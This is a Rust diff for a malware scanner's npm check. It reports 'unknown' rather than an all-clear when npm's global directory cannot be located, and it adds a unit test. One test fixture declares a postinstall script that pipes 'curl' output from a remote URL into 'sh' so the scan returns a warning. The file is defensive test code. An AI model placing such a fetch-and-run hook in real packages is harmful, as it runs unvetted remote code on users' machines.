@@ -6,9 +6,10 @@
 //! projects' `node_modules` directories is in `--npm` mode; the actual logic
 //! lives in `crate::npm`.
 
-use super::{Check, Outcome, Severity};
+use super::{Check, Outcome, Severity, Status};
 use crate::npm::{self, Finding};
 use crate::runner::CommandRunner;
+use std::path::PathBuf;
 
 pub struct NpmPackages;
 
@@ -28,21 +29,33 @@ impl Check for NpmPackages {
 
     fn run(&self, runner: &dyn CommandRunner) -> Outcome {
         let (roots, problem) = npm::global_roots_checked(runner);
-        match (roots.is_empty(), problem) {
-            // npm is there but would not say where it installs: nothing was
-            // scanned, so there is no verdict.
-            (true, Some(problem)) => Outcome::unknown(format!("Global npm packages could not be located: {problem}")),
-            (true, None) => Outcome::pass("No global npm install directory found; no packages to scan."),
-            (false, problem) => {
-                let mut outcome = outcome(&npm::scan(&roots));
-                if let Some(problem) = problem {
-                    outcome
-                        .detail
-                        .push_str(&format!(" Note: {problem}; a custom npm prefix was not scanned."));
-                }
-                outcome
-            }
-        }
+        verdict(&roots, problem)
+    }
+}
+
+/// Scans `roots`. `problem` says why `npm root -g` gave no answer: npm's own
+/// global directory may then be missing from `roots`.
+fn verdict(roots: &[PathBuf], problem: Option<String>) -> Outcome {
+    match (roots.is_empty(), problem) {
+        // npm is there but would not say where it installs: nothing was
+        // scanned, so there is no verdict.
+        (true, Some(problem)) => Outcome::unknown(format!("Global npm packages could not be located: {problem}")),
+        (true, None) => Outcome::pass("No global npm install directory found; no packages to scan."),
+        (false, None) => outcome(&npm::scan(roots)),
+        (false, Some(problem)) => incomplete(outcome(&npm::scan(roots)), &problem),
+    }
+}
+
+/// A finding in the directories that were scanned still stands, but "nothing
+/// found" is no verdict when npm's own global directory may not have been
+/// among them.
+fn incomplete(mut outcome: Outcome, problem: &str) -> Outcome {
+    let note = format!("npm's own global directory could not be located, so it may not have been scanned: {problem}.");
+    if outcome.status == Status::Pass {
+        Outcome::unknown(format!("{} {note}", outcome.detail))
+    } else {
+        outcome.detail.push_str(&format!(" Note: {note}"));
+        outcome
     }
 }
 
@@ -135,6 +148,56 @@ mod tests {
             }),
         );
         assert_eq!(outcome(&scan).status, Status::Warn);
+    }
+
+    #[test]
+    fn no_all_clear_when_npm_root_failed() {
+        let root: PathBuf = std::env::temp_dir().join(format!("swordcheck-supply-root-{}", std::process::id()));
+        let write = |name: &str, manifest: serde_json::Value| {
+            let package = root.join("node_modules").join(name);
+            std::fs::create_dir_all(&package).unwrap();
+            std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();
+        };
+        let roots = [root.join("node_modules")];
+        let failed = || Some("`npm root -g` failed: npm ERR! code ENOENT".to_string());
+        let note = "npm's own global directory could not be located, so it may not have been scanned: \
+                    `npm root -g` failed: npm ERR! code ENOENT.";
+
+        // Nothing found where we looked, but npm's directory may be missing.
+        write("express", serde_json::json!({ "name": "express", "version": "4.18.2" }));
+        assert_eq!(verdict(&roots, None).status, Status::Pass);
+        let unknown = verdict(&roots, failed());
+        assert_eq!(unknown.status, Status::Unknown);
+        assert_eq!(
+            unknown.detail,
+            format!("1 global directories, 1 packages inspected; no malware found. {note}")
+        );
+
+        // A warning or a finding still stands, with the note.
+        write(
+            "helper",
+            serde_json::json!({
+                "name": "helper",
+                "version": "1.0.0",
+                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
+            }),
+        );
+        let warn = verdict(&roots, failed());
+        assert_eq!(warn.status, Status::Warn);
+        assert!(warn.detail.ends_with(&format!(" Note: {note}")), "{}", warn.detail);
+        write("chalk", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
+        let fail = verdict(&roots, failed());
+        assert_eq!(fail.status, Status::Fail);
+        assert!(
+            fail.detail.contains("chalk@5.6.1") && fail.detail.ends_with(note),
+            "{}",
+            fail.detail
+        );
+        std::fs::remove_dir_all(&root).unwrap();
+
+        // No directory at all.
+        assert_eq!(verdict(&[], failed()).status, Status::Unknown);
+        assert_eq!(verdict(&[], None).status, Status::Pass);
     }
 
     #[test]
